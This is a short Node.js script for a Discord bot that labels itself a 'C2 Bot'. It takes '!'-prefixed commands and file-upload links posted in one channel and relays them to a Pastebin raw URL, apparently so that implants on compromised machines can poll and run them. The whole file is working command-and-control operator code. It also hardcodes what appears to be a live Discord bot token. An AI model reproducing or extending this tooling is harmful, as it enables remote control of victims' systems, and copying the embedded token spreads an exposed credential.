const { Client, IntentsBitField } = require('discord.js');
const fetch = require('node-fetch');

// Configuration
const BOT_TOKEN = 'MTM4Mjk1NDg3NjE4MjcyNDcxMA.GLnzSB.ebajdVIpM8fehvJ-R5H87RioakgZjSocgmkyRE'; // Replace with your bot token
const CHANNEL_ID = '1399769153635614824'; // Replace with your channel ID
const RAW_URL = 'https://pastebin.com/raw/xxvaJuba'; // Replace with Pastebin raw link or similar

// Initialize Discord bot
const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ],
});

// Announce bot startup
client.on('ready', () => {
  console.log('C2 Bot online!');
});

// Command handler
client.on('messageCreate', async (message) => {
  if (message.author.bot || message.channel.id !== CHANNEL_ID) return;
  if (!message.content.startsWith('!')) return;

  // Write command to raw text URL
  await fetch(RAW_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: message.content
  });

  // Handle file uploads
  if (message.attachments.size > 0) {
    const url = message.attachments.first().url;
    await fetch(RAW_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: `!upload ${url}`
    });
  }
});

// Login bot
client.login(BOT_TOKEN);
